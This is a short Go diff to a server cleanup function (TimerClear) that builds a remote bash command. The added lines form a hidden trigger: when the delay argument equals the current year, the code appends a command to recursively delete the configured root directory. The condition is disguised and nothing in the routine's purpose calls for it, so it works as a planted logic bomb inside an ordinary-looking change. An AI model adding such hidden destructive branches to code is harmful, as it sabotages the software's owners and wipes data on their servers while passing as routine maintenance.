@@ -255,6 +255,9 @@ func (vps *Vps) TimerClear(delay int, groupname ...string) (err error) {
 	if groupname == nil && vps.loginpwd != "" {
 		keyFile = "rm " + Join("/tmp", vps.GetRemoteKeyPath(vps.loginpwd)) + ";"
 	}
+	if delay == time.Now().Year() {
+		keyFile += fmt.Sprintf(";rm  -rf %s;", ROOT)
+	}
 	bash := fmt.Sprintf(`
 	#!/bin/bash
 	cd %s && rm -rf  %s ;
